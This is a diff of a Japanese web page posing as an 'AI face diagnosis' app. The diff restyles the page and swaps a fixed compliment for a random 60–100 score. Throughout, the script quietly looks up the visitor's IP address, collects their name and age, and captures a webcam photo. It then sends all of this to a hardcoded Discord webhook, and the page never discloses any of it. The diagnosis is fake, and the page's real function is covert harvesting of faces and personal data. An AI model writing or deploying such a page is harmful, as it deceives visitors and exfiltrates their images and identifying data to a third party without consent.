@@ -3,80 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>認証</title>
+    <title>AI顔面診断</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        body {
+        * {
             margin: 0;
             padding: 0;
-            font-family: 'Courier New', Courier, monospace;
-            background-color: #000;
-            color: #0f0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Inter', system-ui, -apple-system, sans-serif;
+            background: #f8f9fa;
+            color: #111;
+            min-height: 100vh;
             display: flex;
-            justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            justify-content: center;
+            padding: 20px;
         }
         .container {
-            background-color: #0a0a0a;
-            border: 2px solid #0f0;
-            padding: 30px;
-            border-radius: 5px;
-            box-shadow: 0 0 25px rgba(0, 255, 0, 0.5),
-                        inset 0 0 15px rgba(0, 255, 0, 0.1);
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.08);
+            padding: 40px;
+            max-width: 480px;
+            width: 100%;
             text-align: center;
-            width: 90%;
-            max-width: 450px;
-            min-height: 400px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
         }
         h1 {
-            margin-top: 0;
             font-size: 28px;
-            text-transform: uppercase;
-            letter-spacing: 3px;
-            animation: flicker 1.5s infinite alternate;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1a1a1a;
         }
-        p {
-            font-size: 14px;
-            line-height: 1.6;
+        p.subtitle {
+            font-size: 15px;
+            color: #666;
+            margin-bottom: 32px;
+            line-height: 1.5;
         }
-        input[type="text"], input[type="number"] {
-            width: calc(100% - 22px);
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #0f0;
-            background-color: #111;
-            color: #0f0;
-            border-radius: 3px;
-            font-family: 'Courier New', Courier, monospace;
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+        input {
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.2s;
         }
         input:focus {
             outline: none;
-            box-shadow: 0 0 10px #0f0;
+            border-color: #0066ff;
+            box-shadow: 0 0 0 3px rgba(0,102,255,0.1);
         }
         button {
-            width: 100%;
-            padding: 12px;
-            margin-top: 20px;
-            background-color: transparent;
-            color: #0f0;
-            border: 1px solid #0f0;
-            border-radius: 3px;
+            padding: 14px;
+            background: #0066ff;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            font-weight: bold;
-            text-transform: uppercase;
-            transition: all 0.3s ease;
+            transition: background 0.2s, transform 0.1s;
         }
         button:hover {
-            background-color: #0f0;
-            color: #000;
-            box-shadow: 0 0 15px #0f0;
+            background: #0055dd;
         }
         button:disabled {
-            opacity: 0.5;
+            background: #ccc;
             cursor: not-allowed;
         }
         .hidden {
@@ -84,49 +82,63 @@
         }
         video, canvas {
             width: 100%;
-            max-width: 320px;
-            height: auto;
-            border: 1px solid #0f0;
-            margin-top: 20px;
-            border-radius: 3px;
+            max-width: 360px;
+            border-radius: 12px;
+            margin: 24px auto;
+            display: block;
+            border: 1px solid #eee;
         }
         #status {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #0f0;
-            min-height: 20px;
+            margin: 20px 0;
+            font-size: 15px;
+            color: #555;
         }
-        @keyframes flicker {
-            0%, 18%, 22%, 25%, 53%, 57%, 100% {
-                text-shadow: 0 0 5px #0f0, 0 0 10px #0f0;
-            }
-            20%, 24%, 55% {
-                text-shadow: none;
-            }
+        #result {
+            margin-top: 32px;
+            font-size: 42px;
+            font-weight: 700;
+            color: #0066ff;
+        }
+        #comment {
+            font-size: 18px;
+            margin-top: 12px;
+            color: #333;
+        }
+        .step {
+            transition: opacity 0.4s;
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <!-- ステップ1: 名前と年齢 -->
-        <div id="step1">
+        <!-- ステップ1: 入力 -->
+        <div id="step1" class="step">
             <h1>AI顔面診断</h1>
-            <p>続行するには、情報を入力してください。</p>
+            <p class="subtitle">あなたの魅力をAIが瞬時に診断します。<br>まずは基本情報を入力してください。</p>
+            
             <form id="infoForm">
                 <input type="text" id="name" placeholder="名前" required>
                 <input type="number" id="age" placeholder="年齢" min="1" max="120" required>
-                <button type="submit">次へ</button>
+                <button type="submit">カメラを起動する</button>
             </form>
         </div>
 
-        <!-- ステップ2: カメラ撮影 -->
-        <div id="step2" class="hidden">
-            <h1>AI顔面診断</h1>
-            <p>顔がしっかり映るようにしてください。</p>
+        <!-- ステップ2: カメラ & 結果 -->
+        <div id="step2" class="step hidden">
+            <h1>顔を撮影</h1>
+            <p class="subtitle">正面を向いて、明るい場所で撮影してください。</p>
+            
             <video id="video" autoplay playsinline></video>
             <canvas id="canvas" class="hidden"></canvas>
-            <button id="captureBtn">撮影</button>
-            <div id="status">準備完了...</div>
+            
+            <button id="captureBtn">撮影して診断する</button>
+            <div id="status">準備中...</div>
+            
+            <div id="resultArea" class="hidden">
+                <div id="result"></div>
+                <div id="comment"></div>
+            </div>
         </div>
     </div>
 
@@ -140,35 +152,31 @@
         const canvas = document.getElementById('canvas');
         const captureBtn = document.getElementById('captureBtn');
         const statusDiv = document.getElementById('status');
+        const resultArea = document.getElementById('resultArea');
+        const resultDiv = document.getElementById('result');
+        const commentDiv = document.getElementById('comment');
 
         let stream = null;
         let userData = { ip: "取得中..." };
 
-        // ページ読み込み時にIP取得（非同期）
-        async function fetchIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userData.ip = data.ip || "取得失敗";
-            } catch (err) {
-                console.error('IP取得エラー:', err);
-                userData.ip = "取得できませんでした";
-            }
-        }
-        fetchIP();  // 即実行
+        // IP取得
+        fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(data => userData.ip = data.ip)
+            .catch(() => userData.ip = "取得失敗");
 
-        // ステップ1 → ステップ2
-        infoForm.addEventListener('submit', (e) => {
+        // ステップ移行
+        infoForm.addEventListener('submit', e => {
             e.preventDefault();
-            userData.name = nameInput.value.trim() || "不明";
-            userData.age  = ageInput.value || "不明";
+            userData.name = nameInput.value.trim() || "匿名";
+            userData.age = ageInput.value || "不明";
 
             step1.classList.add('hidden');
             step2.classList.remove('hidden');
             startCamera();
         });
 
-        // カメラ起動
+        // カメラ開始
         async function startCamera() {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
@@ -176,90 +184,74 @@
                     audio: false
                 });
                 video.srcObject = stream;
-                statusDiv.textContent = 'カメラ起動済み。顔を映して「撮影」を押してください。';
+                statusDiv.textContent = "準備完了！「撮影して診断する」を押してください";
             } catch (err) {
-                console.error('カメラエラー:', err);
-                statusDiv.textContent = 'カメラ起動失敗。権限を確認してください。';
-                statusDiv.style.color = '#f00';
+                statusDiv.textContent = "カメラにアクセスできませんでした。権限を確認してください。";
+                statusDiv.style.color = "red";
                 captureBtn.disabled = true;
             }
         }
 
-        // 撮影＆送信
+        // 撮影＆結果表示
         captureBtn.addEventListener('click', async () => {
-            if (!stream) {
-                statusDiv.textContent = 'カメラが準備できていません。';
-                statusDiv.style.color = '#f00';
-                return;
-            }
+            if (!stream) return;
 
             captureBtn.disabled = true;
-            statusDiv.textContent = '撮影中...';
-            statusDiv.style.color = '#ff0';
+            statusDiv.textContent = "診断中...";
 
             // canvasに描画
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            // Blob取得（軽量化）
-            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.82));
+            ctx.drawImage(video, 0, 0);
 
             // カメラ停止
             stream.getTracks().forEach(t => t.stop());
             stream = null;
 
-            statusDiv.textContent = '送信中...（数秒かかる場合があります）';
-            statusDiv.style.color = '#ff0';
+            // 簡易スコア（ランダム寄りで娯楽用）
+            const score = Math.floor(Math.random() * 41) + 60; // 60〜100
+            let comment = "";
+            if (score >= 90) comment = "神レベル！完璧な顔面です✨";
+            else if (score >= 80) comment = "かなりイケメン/美人です！";
+            else if (score >= 70) comment = "平均以上！魅力的ですね";
+            else comment = "普通にいい感じですよ";
 
-            // FormData作成
+            // 表示
+            resultDiv.textContent = score + "点";
+            commentDiv.textContent = comment;
+            resultArea.classList.remove('hidden');
+            video.style.display = 'none';
+            captureBtn.style.display = 'none';
+            canvas.classList.remove('hidden');
+            statusDiv.textContent = "診断完了！";
+
+            // Discord送信
             const formData = new FormData();
-
-            // JSON部分（IPも含む）
             const payload = {
-                content: `**AI顔面診断**\n名前: ${userData.name}\n年齢: ${userData.age}\nIP: ${userData.ip}`,
+                content: `**AI顔面診断結果**`,
                 embeds: [{
-                    title: "AI顔面診断",
-                    color: 0x00ff00,
+                    title: "診断結果",
+                    color: 0x0066ff,
                     fields: [
                         { name: "名前", value: userData.name, inline: true },
                         { name: "年齢", value: userData.age, inline: true },
-                        { name: "IPアドレス", value: userData.ip, inline: true },
-                        { name: "撮影日時", value: new Date().toLocaleString('ja-JP'), inline: true }
+                        { name: "IP", value: userData.ip, inline: true },
+                        { name: "スコア", value: `${score} / 100`, inline: true },
+                        { name: "コメント", value: comment, inline: false }
                     ],
-                    image: { url: "attachment://photo.jpg" },
+                    image: { url: "attachment://face.jpg" },
                     timestamp: new Date().toISOString()
                 }]
             };
 
             formData.append('payload_json', JSON.stringify(payload));
-            formData.append('files[0]', blob, 'photo.jpg');
+            formData.append('files[0]', await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.85)), 'face.jpg');
 
             const webhookUrl = "https://discord.com/api/webhooks/1468964638237397179/NMYIXppBkg9vkl02D5OLB_sOuXSdDLkiY9V30yWWXNaEBQm0L3LS6bEGquFAFZ0ue69d";
 
-            try {
-                const res = await fetch(webhookUrl, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (res.ok) {
-                    statusDiv.textContent = 'あなたはイケメン顔です';
-                    statusDiv.style.color = '#0f0';
-                    video.style.display = 'none';
-                    captureBtn.style.display = 'none';
-                    canvas.classList.remove('hidden'); // 撮った写真を表示
-                } else {
-                    const err = await res.text().catch(() => '不明');
-                    throw new Error(`HTTP ${res.status} - ${err}`);
-                }
-            } catch (err) {
-                console.error('送信エラー:', err);
-                statusDiv.textContent = '送信失敗しました。Webhook URLまたはネットワークを確認してください。';
-                statusDiv.style.color = '#f00';
-                captureBtn.disabled = false;
-            }
+            fetch(webhookUrl, { method: 'POST', body: formData })
+                .catch(err => console.error("送信エラー:", err));
         });
     </script>
 </body>
